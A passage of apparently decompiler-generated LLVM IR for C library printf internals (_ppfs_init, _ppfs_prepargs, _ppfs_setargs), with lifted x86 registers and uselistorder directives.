  %v3_805c61e = inttoptr i32 %v2_805c61e to i32*
  %v4_805c61e = load i32, i32* %v3_805c61e, align 4
  %v5_805c61e = sub i32 %v0_805c619, %v4_805c61e
  %v15_805c61e = icmp eq i32 %v5_805c61e, 0
  %v16_805c61e = icmp slt i32 %v5_805c61e, 0
  store i1 %v16_805c61e, i1* %sf.global-to-local, align 1
  %v1_805c622 = icmp eq i1 %v15_805c61e, false
  br i1 %v1_805c622, label %dec_label_pc_805c637, label %dec_label_pc_805c624

dec_label_pc_805c624:                             ; preds = %dec_label_pc_805c609, %dec_label_pc_805c391, %dec_label_pc_805c1bc
  %v0_805c624 = phi i32 [ %v1_805c61e, %dec_label_pc_805c609 ], [ %v0_805c624.pre, %dec_label_pc_805c391 ], [ %v1_805c1da, %dec_label_pc_805c1bc ]
  %v1_805c624 = add i32 %v0_805c624, 16
  %v2_805c624 = inttoptr i32 %v1_805c624 to i32*
  %v3_805c624 = load i32, i32* %v2_805c624, align 4
  store i32 %v3_805c624, i32* @ebx, align 4
  store i32 %v3_805c624, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805c114.backedge

dec_label_pc_805c62f:                             ; preds = %dec_label_pc_805c152
  %v1_805c62f = add i32 %v0_805c62f, 2
  %v10_805c62f = icmp slt i32 %v1_805c62f, 0
  store i1 %v10_805c62f, i1* %sf.global-to-local, align 1
  store i32 %v1_805c62f, i32* @ebx, align 4
  br label %dec_label_pc_805c114.backedge

dec_label_pc_805c637:                             ; preds = %dec_label_pc_805c13e, %dec_label_pc_805c609, %dec_label_pc_805c59f, %dec_label_pc_805c54a, %dec_label_pc_805c523, %dec_label_pc_805c493, %dec_label_pc_805c406, %dec_label_pc_805c3c7, %dec_label_pc_805c368, %dec_label_pc_805c5ff
  %v0_805c637 = phi i32 [ %v0_805c5b642, %dec_label_pc_805c5ff ], [ %v0_805c637.pre.pre, %dec_label_pc_805c13e ], [ %v1_805c61e, %dec_label_pc_805c609 ], [ %v0_805c60947, %dec_label_pc_805c59f ], [ %v1_805c572, %dec_label_pc_805c54a ], [ %v1_805c538, %dec_label_pc_805c523 ], [ %v0_805c1b4.lcssa, %dec_label_pc_805c493 ], [ %v1_805c41e, %dec_label_pc_805c406 ], [ %v1_805c3ea, %dec_label_pc_805c3c7 ], [ %v1_805c386, %dec_label_pc_805c368 ]
  %v1_805c637 = inttoptr i32 %v0_805c637 to i32*
  store i32 -1, i32* %v1_805c637, align 4
  br label %dec_label_pc_805c63e

dec_label_pc_805c63e:                             ; preds = %dec_label_pc_805c149, %dec_label_pc_805c0b7, %dec_label_pc_805c0d6, %dec_label_pc_805c637
  %v0_805c63e = load i32, i32* @esp, align 4
  %v1_805c63e = inttoptr i32 %v0_805c63e to i32*
  %v2_805c63e = load i32, i32* %v1_805c63e, align 4
  store i32 %v2_805c63e, i32* %eax.global-to-local, align 4
  %v1_805c641 = add i32 %v0_805c63e, 348
  %v10_805c641 = icmp slt i32 %v1_805c641, 0
  store i1 %v10_805c641, i1* %sf.global-to-local, align 1
  %v3_805c648 = add i32 %v0_805c63e, 356
  %v1_805c649 = inttoptr i32 %v3_805c648 to i32*
  %v2_805c649 = load i32, i32* %v1_805c649, align 4
  store i32 %v2_805c649, i32* @edi, align 4
  %v3_805c649 = add i32 %v0_805c63e, 360
  %v1_805c64a = inttoptr i32 %v3_805c649 to i32*
  %v2_805c64a = load i32, i32* %v1_805c64a, align 4
  store i32 %v2_805c64a, i32* @ebp, align 4
  ret i32 %v2_805c63e

; uselistorder directives
  uselistorder i32 %v1_805c62f, { 1, 2, 0 }
  uselistorder i32 %v3_805c624, { 2, 3, 0, 1 }
  uselistorder i32 %v0_805c609, { 1, 0 }
  uselistorder i32 %v2_805c603, { 1, 2, 3, 0 }
  uselistorder i32 %v0_805c5e2, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_805c5dd, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_805c5bd, { 1, 0 }
  uselistorder i32 %v0_805c5b6.pre, { 1, 0 }
  uselistorder i32 %v0_805c589, { 1, 0 }
  uselistorder i32 %v3_805c57d, { 1, 0 }
  uselistorder i32 %v0_805c572, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_805c54a, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_805c523, { 0, 2, 1, 3 }
  uselistorder i8 %v4_805c50b, { 1, 0 }
  uselistorder i32 %v2_805c4f7, { 1, 0, 2, 3 }
  uselistorder i32 %v6_805c4e4, { 1, 0 }
  uselistorder i32 %v1_805c4e1, { 1, 0 }
  uselistorder i32 %v1_805c4d7, { 1, 0 }
  uselistorder i32 %v0_805c4d7, { 0, 2, 1, 3 }
  uselistorder i32 %v1_805c4b6, { 1, 0 }
  uselistorder i32 %v1_805c493, { 1, 0 }
  uselistorder i32 %v1_805c451, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_805c46d, { 3, 2, 1, 0 }
  uselistorder i32 %v1_805c436, { 1, 0 }
  uselistorder i32 %v1_805c421, { 1, 0 }
  uselistorder i32 %v1_805c3ed, { 1, 0 }
  uselistorder i32 %v0_805c3c7, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v0_805c3ad, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v1_805c399, { 1, 0 }
  uselistorder i32 %v1_805c34f, { 1, 0 }
  uselistorder i32 %v4_805c31d, { 1, 0 }
  uselistorder i32 %v0_805c312, { 1, 0, 2, 3 }
  uselistorder i8 %v3_805c30d, { 1, 0 }
  uselistorder i32 %v0_805c346, { 1, 0, 2, 3 }
  uselistorder i8 %v3_805c2fd, { 1, 0 }
  uselistorder i32 %v1_805c2f4, { 1, 0 }
  uselistorder i32 %v1_805c2e8, { 1, 0 }
  uselistorder i32 %v3_805c2dc, { 1, 2, 0, 3 }
  uselistorder i32 %v3_805c2d2, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_805c2cd, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32 %v2_805c2cb, { 1, 0 }
  uselistorder i32 %v0_805c31d, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_805c30d, { 1, 2, 0 }
  uselistorder i32 %v3_805c2a5, { 0, 1, 3, 2 }
  uselistorder i8 %v4_805c293, { 1, 0 }
  uselistorder i32 %v4_805c28a, { 1, 0 }
  uselistorder i32 %v3_805c28a, { 1, 0 }
  uselistorder i32 %v6_805c282, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 %v0_805c253, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v1_805c252, { 2, 1, 0 }
  uselistorder i32 %v1_805c22b, { 1, 0 }
  uselistorder i32 %v1_805c21f, { 1, 0 }
  uselistorder i32 %v1_805c21a, { 1, 0 }
  uselistorder i32 %v2_805c212, { 1, 0 }
  uselistorder i32 %tmp69, { 1, 0 }
  uselistorder i32 %v3_805c1fc, { 1, 0, 2 }
  uselistorder i8 %v3_805c1eb, { 1, 2, 0, 3 }
  uselistorder i32 %v1_805c1e2, { 1, 0 }
  uselistorder i32 %v3_805c1b4, { 8, 13, 14, 0, 1, 5, 6, 11, 10, 7, 2, 12, 15, 16, 9, 3, 4, 17, 18, 19 }
  uselistorder i32 %v0_805c1b4.lcssa, { 0, 8, 9, 7, 6, 10, 26, 25, 13, 14, 15, 16, 17, 18, 12, 11, 21, 20, 19, 24, 23, 22, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_805c1b0, { 1, 0 }
  uselistorder i32 %v1_805c1b0.pre, { 1, 0 }
  uselistorder i32 %v1_805c1af, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_805c1ac, { 1, 0 }
  uselistorder i32 %v2_805c1b073, { 1, 0 }
  uselistorder i32 %v3_805c196, { 1, 0 }
  uselistorder i8 %v4_805c152, { 1, 0 }
  uselistorder i32 %v1_805c152, { 1, 0, 3, 2 }
  uselistorder i8 %v2_805c149, { 1, 0 }
  uselistorder i32 %v2_805c11e, { 0, 2, 1, 3, 4 }
  uselistorder i8 %v2_805c11a, { 1, 0 }
  uselistorder i8 %v2_805c114, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805c122, { 0, 1, 3, 2 }
  uselistorder i32 %v0_805c104, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 3, 2, 5, 4, 8, 0, 7, 6, 1, 9, 10, 11, 12 }
  uselistorder i1* %sf.global-to-local, { 1, 2, 3, 8, 4, 5, 6, 7, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 87, 88, 86, 89, 90, 91, 92, 93, 94 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 12, 11, 13, 14, 19, 15, 16, 17, 20, 18, 21, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 0, 1, 2, 53, 54, 55, 56, 57, 59, 58, 60, 61, 62, 63 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 356, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 204, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_805c63e, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_805c637, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_805c5ff, { 1, 0 }
  uselistorder label %dec_label_pc_805c5b6, { 1, 0 }
  uselistorder label %dec_label_pc_805c59f, { 1, 0 }
  uselistorder label %dec_label_pc_805c54a, { 1, 0 }
  uselistorder label %dec_label_pc_805c51c, { 1, 0 }
  uselistorder label %dec_label_pc_805c501, { 1, 0 }
  uselistorder label %dec_label_pc_805c4eb, { 1, 0 }
  uselistorder label %dec_label_pc_805c4d7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805c4d2, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805c464, { 1, 0 }
  uselistorder label %dec_label_pc_805c44a, { 1, 0 }
  uselistorder label %dec_label_pc_805c368, { 1, 0 }
  uselistorder label %dec_label_pc_805c30d, { 5, 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_805c2bb, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_805c26b, { 1, 0 }
  uselistorder label %dec_label_pc_805c252, { 1, 0 }
  uselistorder label %dec_label_pc_805c23e, { 1, 0 }
  uselistorder label %dec_label_pc_805c239, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805c21a, { 1, 0 }
  uselistorder label %dec_label_pc_805c1a5, { 1, 0 }
  uselistorder label %dec_label_pc_805c19d, { 1, 0 }
  uselistorder label %dec_label_pc_805c149, { 1, 0 }
  uselistorder label %dec_label_pc_805c13e, { 1, 0 }
  uselistorder label %dec_label_pc_805c114.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805c64c = load i32, i32* @esi, align 4
  %v0_805c64d = load i32, i32* @ebx, align 4
  store i32 %v0_805c64d, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_805c661 = bitcast i32* %arg1 to i8*
  %v4_805c661 = call i32 @__GI_memset(i8* %v3_805c661, i32 0, i32 188)
  %v0_805c666 = load i32, i32* @ebx, align 4
  %v1_805c666 = add i32 %v0_805c666, 40
  store i32 %v1_805c666, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  %v1_805c66e = add i32 %v0_805c666, 24
  %v2_805c66e = inttoptr i32 %v1_805c66e to i32*
  %v3_805c66e = load i32, i32* %v2_805c66e, align 4
  %v4_805c66e = add i32 %v3_805c66e, -1
  store i32 %v4_805c66e, i32* %v2_805c66e, align 4
  %v0_805c674 = load i32, i32* @esi, align 4
  %v1_805c674 = load i32, i32* @ebx, align 4
  %v2_805c674 = inttoptr i32 %v1_805c674 to i32*
  store i32 %v0_805c674, i32* %v2_805c674, align 4
  %v0_805c676.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805c676

dec_label_pc_805c676:                             ; preds = %dec_label_pc_805c676, %entry
  %v0_805c676 = phi i32 [ %v1_805c67c, %dec_label_pc_805c676 ], [ %v0_805c676.pre, %entry ]
  %v1_805c676 = inttoptr i32 %v0_805c676 to i32*
  store i32 8, i32* %v1_805c676, align 4
  %v0_805c67c = load i32, i32* %eax.global-to-local, align 4
  %v1_805c67c = add i32 %v0_805c67c, 4
  store i32 %v1_805c67c, i32* %eax.global-to-local, align 4
  %v0_805c67f = load i32, i32* %edx.global-to-local, align 4
  %v1_805c67f = add i32 %v0_805c67f, -1
  %v8_805c67f = icmp eq i32 %v1_805c67f, 0
  store i32 %v1_805c67f, i32* %edx.global-to-local, align 4
  %v1_805c680 = icmp eq i1 %v8_805c67f, false
  br i1 %v1_805c680, label %dec_label_pc_805c676, label %dec_label_pc_805c682

dec_label_pc_805c682:                             ; preds = %dec_label_pc_805c676
  %v0_805c682 = load i32, i32* @esi, align 4
  store i32 %v0_805c682, i32* %eax.global-to-local, align 4
  %v1_805c6ad20 = inttoptr i32 %v0_805c682 to i8*
  %v2_805c6ad21 = load i8, i8* %v1_805c6ad20, align 1
  %v3_805c6ad22 = zext i8 %v2_805c6ad21 to i32
  %v5_805c6ad23 = and i32 %v1_805c67f, -256
  %v6_805c6ad24 = or i32 %v3_805c6ad22, %v5_805c6ad23
  store i32 %v6_805c6ad24, i32* %edx.global-to-local, align 4
  %v4_805c6af25 = icmp eq i8 %v2_805c6ad21, 0
  %v1_805c6b127 = icmp eq i1 %v4_805c6af25, false
  br i1 %v1_805c6b127, label %dec_label_pc_805c68b, label %dec_label_pc_805c6b3

dec_label_pc_805c68b:                             ; preds = %dec_label_pc_805c682, %dec_label_pc_805c6ad.backedge
  %v6_805c6ad30 = phi i32 [ %v6_805c6ad, %dec_label_pc_805c6ad.backedge ], [ %v6_805c6ad24, %dec_label_pc_805c682 ]
  %v2_805c6ad29 = phi i8 [ %v2_805c6ad, %dec_label_pc_805c6ad.backedge ], [ %v2_805c6ad21, %dec_label_pc_805c682 ]
  %v0_805c69028 = phi i32 [ %v0_805c690.be, %dec_label_pc_805c6ad.backedge ], [ %v0_805c682, %dec_label_pc_805c682 ]
  %v10_805c68b = icmp eq i8 %v2_805c6ad29, 37
  %v1_805c68e = icmp eq i1 %v10_805c68b, false
  br i1 %v1_805c68e, label %dec_label_pc_805c6ac, label %dec_label_pc_805c690

dec_label_pc_805c690:                             ; preds = %dec_label_pc_805c68b
  %v1_805c690 = add i32 %v0_805c69028, 1
  store i32 %v1_805c690, i32* %eax.global-to-local, align 4
  %v1_805c691 = inttoptr i32 %v1_805c690 to i8*
  %v2_805c691 = load i8, i8* %v1_805c691, align 1
  %v11_805c691 = icmp eq i8 %v2_805c691, 37
  br i1 %v11_805c691, label %dec_label_pc_805c6ac, label %dec_label_pc_805c696

dec_label_pc_805c696:                             ; preds = %dec_label_pc_805c690
  %v1_805c699 = load i32, i32* @ebx, align 4
  %v2_805c699 = inttoptr i32 %v1_805c699 to i32*
  store i32 %v1_805c690, i32* %v2_805c699, align 4
  %v0_805c69b = load i32, i32* @ebx, align 4
  %v1_805c69c = inttoptr i32 %v0_805c69b to i32*
  %v2_805c69c = call i32 @_ppfs_parsespec(i32* %v1_805c69c)
  store i32 %v2_805c69c, i32* %eax.global-to-local, align 4
  %v2_805c6a4 = icmp slt i32 %v2_805c69c, 0
  br i1 %v2_805c6a4, label %dec_label_pc_805c6b7, label %dec_label_pc_805c6a8

dec_label_pc_805c6a8:                             ; preds = %dec_label_pc_805c696
  %v0_805c6a8 = load i32, i32* @ebx, align 4
  %v1_805c6a8 = inttoptr i32 %v0_805c6a8 to i32*
  %v2_805c6a8 = load i32, i32* %v1_805c6a8, align 4
  %v4_805c6ad.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805c6ad.backedge

dec_label_pc_805c6ac:                             ; preds = %dec_label_pc_805c690, %dec_label_pc_805c68b
  %v0_805c6ac = phi i32 [ %v1_805c690, %dec_label_pc_805c690 ], [ %v0_805c69028, %dec_label_pc_805c68b ]
  %v1_805c6ac = add i32 %v0_805c6ac, 1
  br label %dec_label_pc_805c6ad.backedge

dec_label_pc_805c6ad.backedge:                    ; preds = %dec_label_pc_805c6ac, %dec_label_pc_805c6a8
  %v4_805c6ad.be = phi i32 [ %v4_805c6ad.pre.pre, %dec_label_pc_805c6a8 ], [ %v6_805c6ad30, %dec_label_pc_805c6ac ]
  %v0_805c690.be = phi i32 [ %v2_805c6a8, %dec_label_pc_805c6a8 ], [ %v1_805c6ac, %dec_label_pc_805c6ac ]
  store i32 %v0_805c690.be, i32* %eax.global-to-local, align 4
  %v1_805c6ad = inttoptr i32 %v0_805c690.be to i8*
  %v2_805c6ad = load i8, i8* %v1_805c6ad, align 1
  %v3_805c6ad = zext i8 %v2_805c6ad to i32
  %v5_805c6ad = and i32 %v4_805c6ad.be, -256
  %v6_805c6ad = or i32 %v3_805c6ad, %v5_805c6ad
  store i32 %v6_805c6ad, i32* %edx.global-to-local, align 4
  %v4_805c6af = icmp eq i8 %v2_805c6ad, 0
  %v1_805c6b1 = icmp eq i1 %v4_805c6af, false
  br i1 %v1_805c6b1, label %dec_label_pc_805c68b, label %dec_label_pc_805c6ad.dec_label_pc_805c6b3_crit_edge

dec_label_pc_805c6ad.dec_label_pc_805c6b3_crit_edge: ; preds = %dec_label_pc_805c6ad.backedge
  %v0_805c6b3.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805c6b3

dec_label_pc_805c6b3:                             ; preds = %dec_label_pc_805c6ad.dec_label_pc_805c6b3_crit_edge, %dec_label_pc_805c682
  %v0_805c6b3 = phi i32 [ %v0_805c6b3.pre, %dec_label_pc_805c6ad.dec_label_pc_805c6b3_crit_edge ], [ %v0_805c682, %dec_label_pc_805c682 ]
  %v1_805c6b3 = load i32, i32* @ebx, align 4
  %v2_805c6b3 = inttoptr i32 %v1_805c6b3 to i32*
  store i32 %v0_805c6b3, i32* %v2_805c6b3, align 4
  br label %dec_label_pc_805c6b7

dec_label_pc_805c6b7:                             ; preds = %dec_label_pc_805c696, %dec_label_pc_805c6b3
  %storemerge = phi i32 [ 0, %dec_label_pc_805c6b3 ], [ -1, %dec_label_pc_805c696 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_805c6b7 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805c6b7, i32* @edx, align 4
  %v2_805c6b8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805c6b8, i32* @ebx, align 4
  store i32 %v0_805c64c, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_805c6ad, { 1, 0 }
  uselistorder i8 %v2_805c6ad, { 1, 2, 0 }
  uselistorder i32 %v0_805c690.be, { 2, 1, 0 }
  uselistorder i32 %v0_805c69028, { 1, 0 }
  uselistorder i32 %v0_805c682, { 1, 0, 2, 3 }
  uselistorder i32 %v1_805c67f, { 0, 2, 1 }
  uselistorder i32 %v1_805c67c, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 0, 5, 7, 6, 8 }
  uselistorder label %dec_label_pc_805c6b7, { 1, 0 }
  uselistorder label %dec_label_pc_805c68b, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_805c6bc = load i32, i32* @esi, align 4
  %v0_805c6bd = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805c6c9 = add i32 %arg1, 24
  %v2_805c6c9 = inttoptr i32 %v1_805c6c9 to i32*
  %v3_805c6c9 = load i32, i32* %v2_805c6c9, align 4
  %v2_805c6cc = add i32 %arg1, 76
  %v3_805c6cc = inttoptr i32 %v2_805c6cc to i32*
  store i32 %arg2, i32* %v3_805c6cc, align 4
  %tmp8 = icmp slt i32 %v3_805c6c9, 1
  br i1 %tmp8, label %dec_label_pc_805c6fa, label %dec_label_pc_805c6d3

dec_label_pc_805c6d3:                             ; preds = %entry
  %v1_805c6d6 = load i32, i32* @ebx, align 4
  %v2_805c6d6 = add i32 %v1_805c6d6, 28
  %v3_805c6d6 = inttoptr i32 %v2_805c6d6 to i32*
  store i32 %v3_805c6c9, i32* %v3_805c6d6, align 4
  %v0_805c6d9 = load i32, i32* @ebx, align 4
  %v1_805c6d9 = add i32 %v0_805c6d9, 24
  %v2_805c6d9 = inttoptr i32 %v1_805c6d9 to i32*
  store i32 0, i32* %v2_805c6d9, align 4
  %v0_805c6e0 = load i32, i32* @ebx, align 4
  %v1_805c6e0 = add i32 %v0_805c6e0, 4
  %v2_805c6e0 = inttoptr i32 %v1_805c6e0 to i32*
  store i32 0, i32* %v2_805c6e0, align 4
  %v0_805c6e7 = load i32, i32* @ebx, align 4
  %v1_805c6e7 = add i32 %v0_805c6e7, 8
  %v2_805c6e7 = inttoptr i32 %v1_805c6e7 to i32*
  store i32 0, i32* %v2_805c6e7, align 4
  %v0_805c6ee = load i32, i32* @ebx, align 4
  %v1_805c6ef = call i32 @_ppfs_setargs(i32 %v0_805c6ee)
  %v1_805c6f7 = load i32, i32* @ebx, align 4
  %v2_805c6f7 = add i32 %v1_805c6f7, 24
  %v3_805c6f7 = inttoptr i32 %v2_805c6f7 to i32*
  store i32 %v3_805c6c9, i32* %v3_805c6f7, align 4
  br label %dec_label_pc_805c6fa

dec_label_pc_805c6fa:                             ; preds = %entry, %dec_label_pc_805c6d3
  %v2_805c6fa = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_805c6bd, i32* @ebx, align 4
  store i32 %v0_805c6bc, i32* @esi, align 4
  ret i32 %v2_805c6fa

; uselistorder directives
  uselistorder i32 %v3_805c6c9, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805c6fa, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805c701 = load i32, i32* @ebx, align 4
  store i32 %v0_805c701, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_805c706 = add i32 %arg1, 24
  %v2_805c706 = inttoptr i32 %v1_805c706 to i32*
  %v3_805c706 = load i32, i32* %v2_805c706, align 4
  %v4_805c706 = icmp eq i32 %v3_805c706, 0
  %v1_805c70a = add i32 %arg1, 80
  store i32 %v1_805c70a, i32* %ebx.global-to-local, align 4
  %v1_805c70d = icmp eq i1 %v4_805c706, false
  %v1_805c7c5 = add i32 %arg1, 8
  %v2_805c7c5 = inttoptr i32 %v1_805c7c5 to i32*
  %v3_805c7c5 = load i32, i32* %v2_805c7c5, align 4
  %v8_805c7c5 = icmp eq i32 %v3_805c7c5, -2147483648
  %v1_805c7cc = icmp eq i1 %v8_805c7c5, false
  br i1 %v1_805c70d, label %dec_label_pc_805c7c5, label %dec_label_pc_805c713

dec_label_pc_805c713:                             ; preds = %entry
  br i1 %v1_805c7cc, label %dec_label_pc_805c72d, label %dec_label_pc_805c71c

dec_label_pc_805c71c:                             ; preds = %dec_label_pc_805c713
  %v1_805c71c = add i32 %arg1, 76
  %v2_805c71c = inttoptr i32 %v1_805c71c to i32*
  %v3_805c71c = load i32, i32* %v2_805c71c, align 4
  store i32 %v3_805c71c, i32* %eax.global-to-local, align 4
  %v1_805c71f = add i32 %v3_805c71c, 4
  store i32 %v1_805c71f, i32* %edx.global-to-local, align 4
  store i32 %v1_805c71f, i32* %v2_805c71c, align 4
  %v0_805c725 = load i32, i32* %eax.global-to-local, align 4
  %v1_805c725 = inttoptr i32 %v0_805c725 to i32*
  %v2_805c725 = load i32, i32* %v1_805c725, align 4
  store i32 %v2_805c725, i32* %eax.global-to-local, align 4
  %v1_805c727 = load i32, i32* @ecx, align 4
  %v2_805c727 = add i32 %v1_805c727, 80
  %v3_805c727 = inttoptr i32 %v2_805c727 to i32*
  store i32 %v2_805c725, i32* %v3_805c727, align 4
  %v0_805c72a = load i32, i32* %eax.global-to-local, align 4
  %v1_805c72a = load i32, i32* @ecx, align 4
  %v2_805c72a = add i32 %v1_805c72a, 8
  %v3_805c72a = inttoptr i32 %v2_805c72a to i32*
  store i32 %v0_805c72a, i32* %v3_805c72a, align 4
  %v0_805c72d.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805c72d

dec_label_pc_805c72d:                             ; preds = %dec_label_pc_805c713, %dec_label_pc_805c71c
  %v1_805c73c = phi i32 [ %arg1, %dec_label_pc_805c713 ], [ %v0_805c72d.pre, %dec_label_pc_805c71c ]
  %v1_805c72d = add i32 %v1_805c73c, 4
  %v2_805c72d = inttoptr i32 %v1_805c72d to i32*
  %v3_805c72d = load i32, i32* %v2_805c72d, align 4
  %v8_805c72d = icmp eq i32 %v3_805c72d, -2147483648
  %v1_805c734 = icmp eq i1 %v8_805c72d, false
  br i1 %v1_805c734, label %dec_label_pc_805c747, label %dec_label_pc_805c736

dec_label_pc_805c736:                             ; preds = %dec_label_pc_805c72d
  %v1_805c736 = add i32 %v1_805c73c, 76
  %v2_805c736 = inttoptr i32 %v1_805c736 to i32*
  %v3_805c736 = load i32, i32* %v2_805c736, align 4
  store i32 %v3_805c736, i32* %eax.global-to-local, align 4
  %v1_805c739 = add i32 %v3_805c736, 4
  store i32 %v1_805c739, i32* %edx.global-to-local, align 4
  store i32 %v1_805c739, i32* %v2_805c736, align 4
  %v0_805c73f = load i32, i32* %eax.global-to-local, align 4
  %v1_805c73f = inttoptr i32 %v0_805c73f to i32*
  %v2_805c73f = load i32, i32* %v1_805c73f, align 4
  store i32 %v2_805c73f, i32* %eax.global-to-local, align 4
  %v1_805c741 = load i32, i32* @ecx, align 4
  %v2_805c741 = add i32 %v1_805c741, 80
  %v3_805c741 = inttoptr i32 %v2_805c741 to i32*
  store i32 %v2_805c73f, i32* %v3_805c741, align 4
  %v0_805c744 = load i32, i32* %eax.global-to-local, align 4
  %v1_805c744 = load i32, i32* @ecx, align 4
  %v2_805c744 = add i32 %v1_805c744, 4
  %v3_805c744 = inttoptr i32 %v2_805c744 to i32*
  store i32 %v0_805c744, i32* %v3_805c744, align 4
  %v1_805c7be15.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805c747

dec_label_pc_805c747:                             ; preds = %dec_label_pc_805c72d, %dec_label_pc_805c736
  %v1_805c7be15 = phi i32 [ %v1_805c73c, %dec_label_pc_805c72d ], [ %v1_805c7be15.pre, %dec_label_pc_805c736 ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_805c7be16 = add i32 %v1_805c7be15, 28
  %v3_805c7be17 = inttoptr i32 %v2_805c7be16 to i32*
  %v4_805c7be18 = load i32, i32* %v3_805c7be17, align 4
  %v5_805c7c120 = icmp sgt i32 %v4_805c7be18, 0
  br i1 %v5_805c7c120, label %dec_label_pc_805c74b, label %dec_label_pc_805c7f3.loopexit

dec_label_pc_805c74b:                             ; preds = %dec_label_pc_805c747, %dec_label_pc_805c7bd
  %v1_805c7be22 = phi i32 [ %v1_805c7be, %dec_label_pc_805c7bd ], [ %v1_805c7be15, %dec_label_pc_805c747 ]
  %v1_805c74b21 = phi i32 [ %v1_805c7bd, %dec_label_pc_805c7bd ], [ 0, %dec_label_pc_805c747 ]
  %v2_805c74b = mul i32 %v1_805c74b21, 4
  %v3_805c74b = add i32 %v2_805c74b, 40
  %v4_805c74b = add i32 %v3_805c74b, %v1_805c7be22
  %v5_805c74b = inttoptr i32 %v4_805c74b to i32*
  %v6_805c74b = load i32, i32* %v5_805c74b, align 4
  store i32 %v6_805c74b, i32* %eax.global-to-local, align 4
  %v1_805c74f = add i32 %v6_805c74b, -8
  %v9_805c74f = icmp eq i32 %v1_805c74f, 0
  br i1 %v9_805c74f, label %dec_label_pc_805c7bd, label %dec_label_pc_805c754

dec_label_pc_805c754:                             ; preds = %dec_label_pc_805c74b
  %v10_805c74f = icmp slt i32 %v1_805c74f, 0
